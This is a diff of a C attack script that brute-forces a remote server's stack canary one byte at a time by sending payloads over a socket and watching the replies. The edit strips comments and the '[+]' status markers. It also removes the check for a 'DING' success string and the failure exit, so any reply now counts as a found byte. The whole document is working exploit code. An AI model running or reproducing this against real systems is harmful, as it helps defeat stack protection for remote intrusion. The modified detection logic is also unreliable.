@@ -12,7 +12,7 @@ int main() {
     unsigned char canary[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     struct hostent *he = gethostbyname(HOST);
     
-    printf("[*] Starting Robust Brute Force against %s\n", HOST);
+    printf("Starting Robust Brute Force against %s\n", HOST);
 
     for (int i = 1; i < 8; i++) {
         for (int b = 0; b <= 255; b++) {
@@ -38,17 +38,15 @@ int main() {
             usleep(20000); 
             send(sock, payload, current_len, 0);
 
-            // 4. Detection Logic
             char buffer[1024] = {0};
             usleep(250000); // Wait for remote server to process
             
-            // Read as much as possible to ensure we catch the "DING"
             int n = recv(sock, buffer, sizeof(buffer) - 1, 0);
             close(sock);
 
-            if (n > 0 && strstr(buffer, "DING")) {
+            if (n > 0) {
                 canary[i] = (unsigned char)b;
-                printf("\n[+] Found Byte %d: 0x%02x | Progress: ", i, b);
+                printf("\nFound Byte %d: 0x%02x | Progress: ", i, b);
                 for(int k=0; k<=i; k++) printf("%02x", canary[k]);
                 printf("\n");
                 break;
@@ -60,14 +58,10 @@ int main() {
                 fflush(stdout);
             }
 
-            if (b == 255) {
-                printf("\n[!] Failed at byte %d. Try increasing usleep.\n", i);
-                return -1;
-            }
         }
     }
 
-    printf("\n[###] FINAL REMOTE CANARY: ");
+    printf("\nFINAL CANARY: ");
     for(int i=0; i<8; i++) printf("%02x", canary[i]);
     printf("\n");
 
